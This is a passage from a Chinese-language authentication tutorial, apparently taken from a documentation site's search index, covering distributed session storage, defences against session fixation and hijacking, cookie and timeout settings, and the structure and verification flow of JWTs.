\u603b\u662f\u8def\u7531\u5230server2\n</code></pre> <p>\u4f18\u70b9\uff1a - \u2705 \u5b9e\u73b0\u7b80\u5355\uff0c\u65e0\u9700\u4fee\u6539\u5e94\u7528\u4ee3\u7801 - \u2705 \u65e0Session\u540c\u6b65\u5f00\u9500</p> <p>\u7f3a\u70b9\uff1a - \u274c \u670d\u52a1\u5668\u5b95\u673a\u5bfc\u81f4Session\u4e22\u5931 - \u274c \u8d1f\u8f7d\u4e0d\u5747\u8861\uff08\u67d0\u4e9b\u670d\u52a1\u5668\u538b\u529b\u5927\uff09 - \u274c \u6269\u5bb9\u7f29\u5bb9\u56f0\u96be</p> <p>\u65b9\u68482\uff1aSession\u590d\u5236\uff08Session Replication\uff09</p> <pre><code>\u539f\u7406\uff1a\u6bcf\u53f0\u670d\u52a1\u5668\u540c\u6b65Session\u6570\u636e\u5230\u5176\u4ed6\u670d\u52a1\u5668\n\nServer A\u521b\u5efaSession \u2192 \u5e7f\u64ad\u5230Server B, C, D\nServer B\u4fee\u6539Session \u2192 \u5e7f\u64ad\u5230Server A, C, D\n\n\u5b9e\u73b0\uff1aTomcat Cluster\u3001Spring Session\n</code></pre> <p>\u4f18\u70b9\uff1a - \u2705 \u9ad8\u53ef\u7528\uff0c\u4efb\u610f\u670d\u52a1\u5668\u5b95\u673a\u4e0d\u5f71\u54cd - \u2705 \u7528\u6237\u8bf7\u6c42\u53ef\u8def\u7531\u5230\u4efb\u610f\u670d\u52a1\u5668</p> <p>\u7f3a\u70b9\uff1a - \u274c \u7f51\u7edc\u5f00\u9500\u5927\uff08N\u00b2\u590d\u6742\u5ea6\uff09 - \u274c Session\u6570\u636e\u4e0d\u4e00\u81f4\u98ce\u9669 - \u274c \u6269\u5c55\u6027\u5dee\uff08\u670d\u52a1\u5668\u591a\u65f6\u6027\u80fd\u4e0b\u964d\uff09</p> <p>\u65b9\u68483\uff1a\u96c6\u4e2d\u5f0fSession\u5b58\u50a8\uff08\u63a8\u8350\uff09</p> <pre><code>\u539f\u7406\uff1a\u5c06Session\u7edf\u4e00\u5b58\u50a8\u5728\u5916\u90e8\u5b58\u50a8\uff08Redis/Memcached\uff09\n\n\u6240\u6709\u670d\u52a1\u5668 \u2192 \u5171\u4eabRedis \u2192 \u7edf\u4e00Session\u5b58\u50a8\n\n\u67b6\u6784\uff1a\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Server A \u2502    \u2502 Server B \u2502    \u2502 Server C \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502               \u2502               \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                     \u2502\n              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n              \u2502    Redis    \u2502\n              \u2502   (Session  \u2502\n              \u2502   Storage)  \u2502\n              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u4f18\u70b9\uff1a - \u2705 \u5b8c\u7f8e\u652f\u6301\u5206\u5e03\u5f0f - \u2705 \u6613\u4e8e\u6269\u5c55 - \u2705 \u6570\u636e\u4e00\u81f4\u6027\u597d - \u2705 \u652f\u6301\u6301\u4e45\u5316</p> <p>\u7f3a\u70b9\uff1a - \u274c Redis\u6210\u4e3a\u5355\u70b9\uff08\u9700\u8981\u9ad8\u53ef\u7528\u65b9\u6848\uff09 - \u274c \u7f51\u7edc\u5ef6\u8fdf\uff08\u76f8\u6bd4\u672c\u5730\u5185\u5b58\uff09</p> <p>\u65b9\u6848\u9009\u62e9\u5efa\u8bae\uff1a <pre><code>1. \u5c0f\u578b\u5355\u4f53\u5e94\u7528\uff08&lt;3\u53f0\u670d\u52a1\u5668\uff09\n   \u2192 Session\u7c98\u6ede\n\n2. \u4e2d\u578b\u5206\u5e03\u5f0f\u5e94\u7528\n   \u2192 Redis\u96c6\u4e2d\u5b58\u50a8\n\n3. \u5927\u578b\u5fae\u670d\u52a1\u67b6\u6784\n   \u2192 Token\u65b9\u6848\uff08JWT\uff09\u66ff\u4ee3Session\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#16-session","title":"1.6 Session\u5b89\u5168\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1-sessionsession-fixation","title":"1. \u9632\u6b62Session\u56fa\u5b9a\u653b\u51fb\uff08Session Fixation\uff09","text":"<p>\u653b\u51fb\u539f\u7406\uff1a <pre><code>1. \u653b\u51fb\u8005\u83b7\u53d6\u4e00\u4e2aSessionID\uff1aabc123\n2. \u653b\u51fb\u8005\u8bf1\u9a97\u53d7\u5bb3\u8005\u4f7f\u7528\u8fd9\u4e2aSessionID\u767b\u5f55\n   \uff08\u901a\u8fc7\u94fe\u63a5\uff1ahttp://example.com?jsessionid=abc123\uff09\n3. \u53d7\u5bb3\u8005\u7528\u81ea\u5df1\u7684\u8d26\u53f7\u767b\u5f55\u6210\u529f\n4. \u653b\u51fb\u8005\u4f7f\u7528abc123\u8bbf\u95ee\uff0c\u83b7\u5f97\u53d7\u5bb3\u8005\u6743\u9650\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a <pre><code>// \u767b\u5f55\u6210\u529f\u540e\u91cd\u65b0\u751f\u6210SessionID\npublic void onLoginSuccess(HttpServletRequest request, User user) {\n    // 1. \u83b7\u53d6\u65e7Session\u7684\u6570\u636e\n    HttpSession oldSession = request.getSession(false);\n    Map&lt;String, Object&gt; attributes = saveAttributes(oldSession);\n\n    // 2. \u4f7f\u65e7Session\u5931\u6548\n    if (oldSession != null) {\n        oldSession.invalidate();\n    }\n\n    // 3. \u521b\u5efa\u65b0Session\n    HttpSession newSession = request.getSession(true);\n\n    // 4. \u6062\u590d\u6570\u636e\u5230\u65b0Session\n    restoreAttributes(newSession, attributes);\n\n    // 5. \u5b58\u50a8\u7528\u6237\u4fe1\u606f\n    newSession.setAttribute(\"user\", user);\n\n    // \u65e5\u5fd7\u8bb0\u5f55\n    log.info(\"Session regenerated for user: {}\", user.getUsername());\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2-sessionsession-hijacking","title":"2. \u9632\u6b62Session\u52ab\u6301\uff08Session Hijacking\uff09","text":"<p>\u653b\u51fb\u65b9\u5f0f\uff1a - \u7a83\u53d6Cookie\uff08XSS\u653b\u51fb\u3001\u7f51\u7edc\u55c5\u63a2\uff09 - \u4e2d\u95f4\u4eba\u653b\u51fb\uff08HTTP\u4f20\u8f93\uff09</p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <pre><code>// Cookie\u5b89\u5168\u914d\u7f6e\nCookie sessionCookie = new Cookie(\"JSESSIONID\", sessionId);\n\n// 1. HttpOnly\uff1a\u9632\u6b62JavaScript\u8bbf\u95ee\uff08\u9632XSS\uff09\nsessionCookie.setHttpOnly(true);\n\n// 2. Secure\uff1a\u4ec5HTTPS\u4f20\u8f93\uff08\u9632\u7f51\u7edc\u55c5\u63a2\uff09\nsessionCookie.setSecure(true);\n\n// 3. SameSite\uff1a\u9632\u6b62CSRF\u653b\u51fb\nsessionCookie.setSameSite(\"Strict\");\n// Strict: \u5b8c\u5168\u7981\u6b62\u7b2c\u4e09\u65b9Cookie\n// Lax: \u5141\u8bb8\u90e8\u5206\u7b2c\u4e09\u65b9\u8bf7\u6c42\uff08GET\u5bfc\u822a\uff09\n// None: \u4e0d\u9650\u5236\uff08\u9700\u914d\u5408Secure\uff09\n\n// 4. \u8bbe\u7f6e\u8def\u5f84\u548c\u57df\nsessionCookie.setPath(\"/\");\nsessionCookie.setDomain(\".example.com\");  // \u8de8\u5b50\u57df\u5171\u4eab\n\n// 5. \u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\nsessionCookie.setMaxAge(1800);  // 30\u5206\u949f\n</code></pre> <p>\u989d\u5916\u9632\u62a4\uff1a <pre><code>// \u7ed1\u5b9aIP\u5730\u5740\uff08\u53ef\u9009\uff0c\u79fb\u52a8\u7f51\u7edcIP\u4f1a\u53d8\uff09\npublic boolean validateSession(String sessionId, String clientIp) {\n    SessionData session = getSession(sessionId);\n    if (session == null) return false;\n\n    // \u68c0\u67e5IP\u662f\u5426\u5339\u914d\n    if (!session.getIpAddress().equals(clientIp)) {\n        log.warn(\"IP mismatch for session: {}\", sessionId);\n        return false;\n    }\n    return true;\n}\n\n// \u7ed1\u5b9aUser-Agent\uff08\u68c0\u6d4b\u6d4f\u89c8\u5668\u53d8\u5316\uff09\npublic boolean validateUserAgent(SessionData session, String userAgent) {\n    return session.getUserAgent().equals(userAgent);\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3-session","title":"3. Session\u8d85\u65f6\u7b56\u7565","text":"<p>\u56fa\u5b9a\u8d85\u65f6\uff08Absolute Timeout\uff09\uff1a <pre><code>\u4ece\u521b\u5efa\u65f6\u523b\u5f00\u59cb\u8ba1\u65f6\uff0c\u5230\u671f\u5fc5\u987b\u91cd\u65b0\u767b\u5f55\n\n\u4f7f\u7528\u573a\u666f\uff1a\u9ad8\u5b89\u5168\u573a\u666f\uff08\u94f6\u884c\u3001\u652f\u4ed8\uff09\n\u5b9e\u73b0\uff1a\nsession.setMaxInactiveInterval(3600);  // 1\u5c0f\u65f6\u540e\u5f3a\u5236\u8fc7\u671f\n</code></pre></p> <p>\u6ed1\u52a8\u8d85\u65f6\uff08Sliding Timeout\uff09\uff1a <pre><code>\u6bcf\u6b21\u6d3b\u52a8\u90fd\u91cd\u7f6e\u8fc7\u671f\u65f6\u95f4\n\n\u4f7f\u7528\u573a\u666f\uff1a\u666e\u901a\u5e94\u7528\n\u5b9e\u73b0\uff1a\n\u6bcf\u6b21\u8bf7\u6c42\u90fd\u66f4\u65b0\uff1alast_accessed_at = NOW()\n</code></pre></p> <p>\u7ec4\u5408\u7b56\u7565\uff08\u63a8\u8350\uff09\uff1a <pre><code>public class SessionExpirationPolicy {\n    private int slidingTimeout = 30;    // 30\u5206\u949f\u65e0\u64cd\u4f5c\n    private int absoluteTimeout = 480;  // 8\u5c0f\u65f6\u7edd\u5bf9\u8d85\u65f6\n\n    public boolean isExpired(SessionData session) {\n        long now = System.currentTimeMillis();\n\n        // \u68c0\u67e5\u7edd\u5bf9\u8d85\u65f6\n        if (now - session.getCreatedTime() &gt; absoluteTimeout * 60 * 1000) {\n            return true;\n        }\n\n        // \u68c0\u67e5\u6ed1\u52a8\u8d85\u65f6\n        if (now - session.getLastAccessTime() &gt; slidingTimeout * 60 * 1000) {\n            return true;\n        }\n\n        return false;\n    }\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4","title":"4. \u5e76\u53d1\u4f1a\u8bdd\u63a7\u5236","text":"<p>\u5355\u8bbe\u5907\u767b\u5f55\uff1a <pre><code>public void limitConcurrentSessions(String userId) {\n    // \u83b7\u53d6\u7528\u6237\u7684\u6240\u6709Session\n    List&lt;String&gt; existingSessions = redis.keys(\"session:user:\" + userId + \":*\");\n\n    // \u4f7f\u65e7Session\u5931\u6548\n    for (String sessionKey : existingSessions) {\n        redis.del(sessionKey);\n    }\n\n    // \u521b\u5efa\u65b0Session\n    createNewSession(userId);\n}\n</code></pre></p> <p>\u591a\u8bbe\u5907\u767b\u5f55\uff08\u9650\u5236\u6570\u91cf\uff09\uff1a <pre><code>public boolean checkConcurrentSessions(String userId, int maxSessions) {\n    List&lt;String&gt; sessions = getUserSessions(userId);\n\n    if (sessions.size() &gt;= maxSessions) {\n        // \u5220\u9664\u6700\u65e7\u7684Session\n        String oldestSession = findOldestSession(sessions);\n        removeSession(oldestSession);\n    }\n\n    return true;\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#17-session","title":"1.7 Session\u5b9e\u9645\u5e94\u7528\u573a\u666f","text":"<p>\u573a\u666f1\uff1a\u5355\u4f53\u5e94\u7528 <pre><code>\u6280\u672f\u6808\uff1aSpring Boot + Tomcat\nSession\u7ba1\u7406\uff1a\u5185\u5b58\u5b58\u50a8\n\u9002\u7528\u89c4\u6a21\uff1a&lt;1000\u5e76\u53d1\u7528\u6237\n\n\u914d\u7f6e\uff1a\nserver.servlet.session.timeout=30m\nserver.servlet.session.cookie.http-only=true\nserver.servlet.session.cookie.secure=true\n</code></pre></p> <p>\u573a\u666f2\uff1a\u5206\u5e03\u5f0f\u5e94\u7528 <pre><code>\u6280\u672f\u6808\uff1aSpring Boot + Redis\nSession\u7ba1\u7406\uff1aSpring Session + Redis\n\u9002\u7528\u89c4\u6a21\uff1a&gt;10000\u5e76\u53d1\u7528\u6237\n\n\u914d\u7f6e\uff1a\nspring.session.store-type=redis\nspring.redis.host=redis-cluster\nspring.session.timeout=30m\n</code></pre></p> <p>\u573a\u666f3\uff1a\u8de8\u5b50\u57dfSession\u5171\u4eab <pre><code>\u9700\u6c42\uff1a\n- www.example.com\n- api.example.com\n- admin.example.com\n\u5171\u4eab\u767b\u5f55\u72b6\u6001\n\n\u914d\u7f6e\uff1a\nCookie\u57df\u8bbe\u7f6e\uff1a.example.com\nSession\u5b58\u50a8\uff1aRedis\uff08\u6240\u6709\u5b50\u57df\u5171\u4eab\uff09\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2-jwtjson-web-token","title":"2. JWT\uff08JSON Web Token\uff09\u8be6\u89e3","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#21-jwtwhat-why","title":"2.1 JWT\u57fa\u7840\u7406\u8bba\uff08What &amp; Why\uff09","text":"<p>JWT\u662f\u4ec0\u4e48\uff1f</p> <p>JWT\uff08JSON Web Token\uff09\u662f\u4e00\u79cd**\u5f00\u653e\u6807\u51c6\uff08RFC 7519\uff09**\uff0c\u5b9a\u4e49\u4e86\u4e00\u79cd\u7d27\u51d1\u4e14\u81ea\u5305\u542b\u7684\u65b9\u5f0f\uff0c\u7528\u4e8e\u5728\u5404\u65b9\u4e4b\u95f4\u5b89\u5168\u5730\u4f20\u8f93\u4fe1\u606f\u4f5c\u4e3aJSON\u5bf9\u8c61\u3002</p> <p>\u8bbe\u8ba1\u76ee\u6807\uff1a 1. \u65e0\u72b6\u6001\uff1a\u670d\u52a1\u5668\u4e0d\u9700\u8981\u5b58\u50a8Session 2. \u53ef\u6269\u5c55\uff1a\u5929\u7136\u652f\u6301\u5206\u5e03\u5f0f\u548c\u5fae\u670d\u52a1 3. \u8de8\u57df\uff1a\u652f\u6301\u8de8\u57df\u8eab\u4efd\u9a8c\u8bc1 4. \u81ea\u5305\u542b\uff1aToken\u5305\u542b\u6240\u6709\u5fc5\u8981\u4fe1\u606f</p> <p>JWT vs \u4f20\u7edfSession Token\uff1a</p> \u7279\u6027 \u4f20\u7edfSession Token JWT \u5b58\u50a8\u4f4d\u7f6e \u670d\u52a1\u5668\u7aef \u5ba2\u6237\u7aef Token\u5185\u5bb9 \u968f\u673a\u5b57\u7b26\u4e32\uff08\u5f15\u7528\uff09 JSON\u6570\u636e\uff08\u81ea\u5305\u542b\uff09 \u9a8c\u8bc1\u65b9\u5f0f \u67e5\u8be2\u5b58\u50a8 \u9a8c\u8bc1\u7b7e\u540d \u670d\u52a1\u5668\u72b6\u6001 \u6709\u72b6\u6001 \u65e0\u72b6\u6001 \u6269\u5c55\u6027 \u9700\u8981Session\u5171\u4eab \u5929\u7136\u652f\u6301\u5206\u5e03\u5f0f \u64a4\u9500\u80fd\u529b \u5bb9\u6613\uff08\u5220\u9664Session\uff09 \u56f0\u96be\uff08\u9700\u8981\u9ed1\u540d\u5355\uff09 \u5927\u5c0f \u5c0f\uff0832-128\u5b57\u8282\uff09 \u5927\uff08\u901a\u5e38&gt;200\u5b57\u8282\uff09"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#22-jwtstructure","title":"2.2 JWT\u7ed3\u6784\u8be6\u89e3\uff08Structure\uff09","text":"<p>JWT\u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff0c\u7528\u70b9(<code>.</code>)\u5206\u9694\uff1a</p> <pre><code>JWT = Header.Payload.Signature\n</code></pre> <p>\u5b8c\u6574\u793a\u4f8b\uff1a <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#part-1-header","title":"Part 1: Header\uff08\u5934\u90e8\uff09","text":"<p>**\u4f5c\u7528\uff1a**\u63cf\u8ff0Token\u7684\u5143\u6570\u636e</p> <p>\u5178\u578b\u7ed3\u6784\uff1a <pre><code>{\n  \"alg\": \"HS256\",     // \u7b7e\u540d\u7b97\u6cd5\uff08Algorithm\uff09\n  \"typ\": \"JWT\"        // Token\u7c7b\u578b\uff08Type\uff09\n}\n</code></pre></p> <p>Base64URL\u7f16\u7801\u540e\uff1a <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n</code></pre></p> <p>\u5e38\u7528\u7b97\u6cd5\uff1a <pre><code>\u5bf9\u79f0\u7b97\u6cd5\uff08HMAC\uff09\uff1a\n- HS256: HMAC + SHA-256\n- HS384: HMAC + SHA-384\n- HS512: HMAC + SHA-512\n\n\u975e\u5bf9\u79f0\u7b97\u6cd5\uff08RSA/ECDSA\uff09\uff1a\n- RS256: RSA + SHA-256\n- RS384: RSA + SHA-384\n- RS512: RSA + SHA-512\n- ES256: ECDSA + SHA-256\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#part-2-payload","title":"Part 2: Payload\uff08\u8f7d\u8377\uff09","text":"<p>**\u4f5c\u7528\uff1a**\u5b58\u50a8\u5b9e\u9645\u6570\u636e\uff08Claims\uff09</p> <p>Payload\u7ed3\u6784\uff1a <pre><code>{\n  // \u6807\u51c6Claims\uff08Registered Claims\uff09\n  \"iss\": \"https://auth.example.com\",  // Issuer\uff08\u7b7e\u53d1\u8005\uff09\n  \"sub\": \"1234567890\",                 // Subject\uff08\u4e3b\u9898\uff0c\u901a\u5e38\u662f\u7528\u6237ID\uff09\n  \"aud\": \"https://api.example.com\",    // Audience\uff08\u53d7\u4f17\uff09\n  \"exp\": 1735689600,                   // Expiration Time\uff08\u8fc7\u671f\u65f6\u95f4\uff0cUnix\u65f6\u95f4\u6233\uff09\n  \"nbf\": 1735686000,                   // Not Before\uff08\u751f\u6548\u65f6\u95f4\uff09\n  \"iat\": 1735686000,                   // Issued At\uff08\u7b7e\u53d1\u65f6\u95f4\uff09\n  \"jti\": \"unique-token-id-123\",        // JWT ID\uff08\u552f\u4e00\u6807\u8bc6\u7b26\uff09\n\n  // \u81ea\u5b9a\u4e49Claims\uff08Private Claims\uff09\n  \"username\": \"zhangsan\",\n  \"roles\": [\"user\", \"admin\"],\n  \"permissions\": [\"read\", \"write\"]\n}\n</code></pre></p> <p>Base64URL\u7f16\u7801\u540e\uff1a <pre><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ\n</code></pre></p> <p>\u6807\u51c6Claims\u8be6\u89e3\uff1a</p> Claim \u540d\u79f0 \u8bf4\u660e \u793a\u4f8b iss Issuer Token\u7b7e\u53d1\u8005 <code>\"https://auth.example.com\"</code> sub Subject Token\u4e3b\u9898\uff08\u7528\u6237ID\uff09 <code>\"user123\"</code> aud Audience Token\u53d7\u4f17\uff08\u8c01\u53ef\u4ee5\u4f7f\u7528\uff09 <code>\"api.example.com\"</code> \u6216 <code>[\"api\", \"web\"]</code> exp Expiration \u8fc7\u671f\u65f6\u95f4\uff08Unix\u65f6\u95f4\u6233\uff09 <code>1735689600</code> (2025-01-01 00:00) nbf Not Before \u751f\u6548\u65f6\u95f4 <code>1735686000</code> iat Issued At \u7b7e\u53d1\u65f6\u95f4 <code>1735686000</code> jti JWT ID Token\u552f\u4e00ID\uff08\u9632\u91cd\u653e\uff09 <code>\"abc-123-def\"</code> <p>\u26a0\ufe0f \u91cd\u8981\u63d0\u793a\uff1a <pre><code>Payload\u662fBase64\u7f16\u7801\uff0c\u4e0d\u662f\u52a0\u5bc6\uff01\n\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u7801\u67e5\u770b\u5185\u5bb9\uff01\n\u274c \u4e0d\u8981\u5728Payload\u4e2d\u5b58\u653e\u654f\u611f\u4fe1\u606f\uff08\u5bc6\u7801\u3001\u4fe1\u7528\u5361\u53f7\uff09\n\u2705 \u53ea\u5b58\u653e\u5fc5\u8981\u7684\u8eab\u4efd\u548c\u6743\u9650\u4fe1\u606f\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#part-3-signature","title":"Part 3: Signature\uff08\u7b7e\u540d\uff09","text":"<p>**\u4f5c\u7528\uff1a**\u9a8c\u8bc1Token\u5b8c\u6574\u6027\u548c\u771f\u5b9e\u6027</p> <p>\u751f\u6210\u7b97\u6cd5\uff08\u4ee5HS256\u4e3a\u4f8b\uff09\uff1a <pre><code>signature = HMACSHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n</code></pre></p> <p>\u5b8c\u6574\u793a\u4f8b\uff1a <pre><code>// \u8f93\u5165\nconst header = '{\"alg\":\"HS256\",\"typ\":\"JWT\"}';\nconst payload = '{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}';\nconst secret = 'my-256-bit-secret';\n\n// \u6b65\u9aa41\uff1aBase64URL\u7f16\u7801\nconst encodedHeader = base64UrlEncode(header);\n// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nconst encodedPayload = base64UrlEncode(payload);\n// eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ\n\n// \u6b65\u9aa42\uff1a\u62fc\u63a5\nconst data = encodedHeader + '.' + encodedPayload;\n\n// \u6b65\u9aa43\uff1a\u7b7e\u540d\nconst signature = HMACSHA256(data, secret);\n// SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n// \u6b65\u9aa44\uff1a\u5b8c\u6574JWT\nconst jwt = data + '.' + base64UrlEncode(signature);\n</code></pre></p> <p>\u7b7e\u540d\u7684\u4f5c\u7528\uff1a 1. \u5b8c\u6574\u6027\u9a8c\u8bc1\uff1a\u68c0\u6d4bToken\u662f\u5426\u88ab\u7be1\u6539 2. \u771f\u5b9e\u6027\u9a8c\u8bc1\uff1a\u786e\u8ba4Token\u7531\u6388\u6743\u670d\u52a1\u5668\u7b7e\u53d1 3. \u4e0d\u53ef\u4f2a\u9020\uff1a\u6ca1\u6709\u5bc6\u94a5\u65e0\u6cd5\u4f2a\u9020\u6709\u6548\u7b7e\u540d</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#23-jwtworkflow","title":"2.3 JWT\u5de5\u4f5c\u6d41\u7a0b\uff08Workflow\uff09","text":"<p>\u5b8c\u6574\u8ba4\u8bc1\u6d41\u7a0b\uff1a</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u5ba2\u6237\u7aef   \u2502                 \u2502 \u8ba4\u8bc1\u670d\u52a1\u5668 \u2502                 \u2502 \u8d44\u6e90\u670d\u52a1\u5668 \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                 \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                 \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                            \u2502                            \u2502\n     \u2502  1. POST /login            \u2502                            \u2502\n     \u2502     username &amp; password    \u2502                            \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502                            \u2502\n     \u2502                            \u2502                            \u2502\n     \u2502                            \u2502  2. \u9a8c\u8bc1\u51ed\u8bc1               \u2502\n     \u2502                            \u2502  3. \u751f\u6210JWT\uff1a              \u2502\n     \u2502                            \u2502     - \u521b\u5efaHeader           \u2502\n     \u2502                            \u2502     - \u521b\u5efaPayload          \u2502\n     \u2502                            \u2502     - \u751f\u6210Signature        \u2502\n     \u2502                            \u2502                            \u2502\n     \u2502  4. \u8fd4\u56deJWT                \u2502                            \u2502\n     \u2502     {                      \u2502                            \u2502\n     \u2502       \"access_token\": \"eyJ...\",                         \u2502\n     \u2502       \"token_type\": \"Bearer\",                           \u2502\n     \u2502       \"expires_in\": 3600    \u2502                            \u2502\n     \u2502     }                       \u2502                            \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                            \u2502\n     \u2502                            \u2502                            \u2502\n     \u2502  5. \u5ba2\u6237\u7aef\u4fdd\u5b58Token        \u2502                            \u2502\n     \u2502     localStorage.setItem('token', ...)                  \u2502\n     \u2502                            \u2502                            \u2502\n     \u2502  6. GET /api/user/profile                               \u2502\n     \u2502     Authorization: Bearer eyJ...                        \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                            \u2502                            \u2502\n     \u2502                            \u2502                            \u2502  7. \u63d0\u53d6Token\n     \u2502                            \u2502                            \u2502  8. \u9a8c\u8bc1Token\uff1a\n     \u2502                            \u2502                            \u2502     - \u89e3\u6790Header\n     \u2502                            \u2502                            \u2502     - \u89e3\u6790Payload\n     \u2502                            \u2502                            \u2502     - \u9a8c\u8bc1\u7b7e\u540d\n     \u2502                            \u2502                            \u2502     - \u68c0\u67e5\u8fc7\u671f\u65f6\u95f4\n     \u2502                            \u2502                            \u2502  9. \u63d0\u53d6\u7528\u6237\u4fe1\u606f\n     \u2502                            \u2502                            \u2502  10. \u6267\u884c\u4e1a\u52a1\u903b\u8f91\n     \u2502                            \u2502                            \u2502\n     \u2502  11. \u8fd4\u56de\u7528\u6237\u6570\u636e                                        \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                            \u2502                            \u2502\n</code></pre> <p>Token\u9a8c\u8bc1\u8be6\u7ec6\u6b65\u9aa4\uff1a</p> <pre><code>/**\n * JWT\u9a8c\u8bc1\u4f2a\u4ee3\u7801\n */\npublic User validateToken(String jwt) {\n    // 1. \u5206\u5272JWT\n    String[] parts = jwt.split(\"\\\\.\");\n    if (parts.length != 3) {\n        throw new InvalidTokenException(\"Invalid JWT format\");\n    }\n\n    String encodedHeader = parts[0];\n    String encodedPayload = parts[1];\n    String encodedSignature 